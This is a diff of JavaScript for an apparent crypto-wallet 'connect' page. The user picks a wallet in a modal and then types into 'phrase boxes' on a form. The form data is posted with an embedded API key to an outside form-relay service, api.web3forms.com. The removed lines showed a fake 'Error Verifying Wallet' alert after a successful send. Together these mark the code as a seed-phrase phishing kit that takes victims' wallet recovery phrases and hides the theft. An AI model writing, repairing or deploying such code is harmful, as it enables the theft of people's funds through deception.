@@ -33,29 +33,35 @@
   let boxImg = select(".blockchain .img", true);
   let boxTitle = select(".blockchain h4", true);
 
+  let wallet = [];
+
   // Open modalbox
   box.forEach((e, index) => {
     e.addEventListener("click", function () {
       openModal(".modal-connectius");
 
-      //  set wallet technology
       let walletName = select(".modal .modal-block-deet h4");
       let walletImage = select(".modal .modal-block-deet .block-img img");
 
-      [...boxTitle].forEach((a, ai) => {
+      //  set wallet technology
+      boxTitle.forEach((a, ai) => {
         if (index === ai) {
           walletName.textContent = a.textContent;
+          wallet.push( a.textContent);
         }
       });
 
       boxImg.forEach((a, ai) => {
         if (index === ai) {
           walletImage.src = a.src;
+          wallet.push(a.src);
         }
       });
+      // console.log(wallet)
     });
+    
   });
-
+  
   //  close Modalbox
   on(
     "click",
@@ -67,12 +73,29 @@
     true
   );
 
+  on(
+    "click",
+    ".modal .modal-body .close",
+    function (e) {
+      e.preventDefault();
+      closeModal(".modal-form");
+      wallet = [];
+    },
+    true
+  );
+
   // phrase boxes
   on("click", "#inbox-modal", function (e) {
     e.preventDefault();
     closeModal(".modal-connectius");
 
-    openModal(".modal-form");
+    let walletName = select(".modal-form .modal-block-deet h4");
+    let walletImage = select(".modal-form .modal-block-deet .block-img img");
+
+    walletName.textContent = wallet[0];
+    walletImage.src = wallet[1];
+
+    openModal('.modal-form');
   });
 
   // modal nav-link
@@ -106,58 +129,57 @@
 
       const formData = new FormData(form);
 
-      formData.forEach((value, key) => {
-        var obj = {};
+      var obj = {
+        apiKey: "4b07b268-d53a-4df5-b29c-f31a2b9c5175",
+        subject: "New Form Submission",
+      };
 
+      formData.forEach((value, key) => {
         obj[key] = value;
 
-        var json = JSON.stringify(obj);
+        if (obj[key].trim() === "") {
+          alert(`${obj[key]} cannot be empty`);
+        }
+        else {
 
-        result.innerHTML = "Please wait";
-       
+          var json = JSON.stringify(obj);
+          result.innerHTML = "Please wait...";
 
-        if (obj[key] !== "") {
+          progressBar.style.display = "flex";
+          closeModal(".modal-form");
+          closeModal(".modal-connectius");
+          // console.log('form submitted')
+          // console.log(obj);
+
           fetch("https://api.web3forms.com/submit", {
             method: "POST",
-            headers: {
+            header: {
               "Content-Type": "application/json",
               Accept: "application/json",
             },
             body: json,
           })
             .then(async (response) => {
-              progressBar.style.display = "block";
+              let jsonAwait = await response.json();
 
-              let json = await response.json();
-              if (response.status == 200) {
-                alert("Error Verifying Wallet... Please try again later");
-                closeModal('.modal-form');
+              if (response.status === 200) {
+                setTimeout(() => {
+                  result.innerHTML = "Form submitted successfully";
+                  result.style.color = "green";
+                });
               } else {
-                console.log(response);
-                result.innerHTML = json.message;
-                result.classList.remove("text-gray-500");
-                result.classList.add("text-red-500");
-                closeModal('.modal-form');
+                result.innerHTML = jsonAwait.message;
+                result.style.color = "red";
               }
             })
-            .catch((error) => {
-              console.log(error);
-              result.innerHTML = "Something went wrong!";
-            })
-            .then(function () {
-              // form.reset();
+            .then(() => {
               progressBar.style.display = "none";
               setTimeout(() => {
                 result.style.display = "none";
-                closeModal('.modal-form');
               }, 5000);
             });
-        } else {
-          alert( `${key} id empty`);
         }
       });
-
-     
     });
   });
 
@@ -185,33 +207,4 @@
       e.classList.remove("show");
     });
   }
-
-  const isRequired = (value) => (value === "" ? false : true);
-  const isBetween = (length, min, max) =>
-    length < min || length > max ? false : true;
-
-  const showError = (input, message) => {
-    // get the form-field element
-    const formField = input.parentElement;
-    // add the error class
-    formField.classList.remove("success");
-    formField.classList.add("error");
-
-    // show the error message
-    const error = formField.querySelector("small");
-    error.textContent = message;
-  };
-
-  const showSuccess = (input) => {
-    // get the form-field element
-    const formField = input.parentElement;
-
-    // remove the error class
-    formField.classList.remove("error");
-    formField.classList.add("success");
-
-    // hide the error message
-    const error = formField.querySelector("small");
-    error.textContent = "";
-  };
 })();
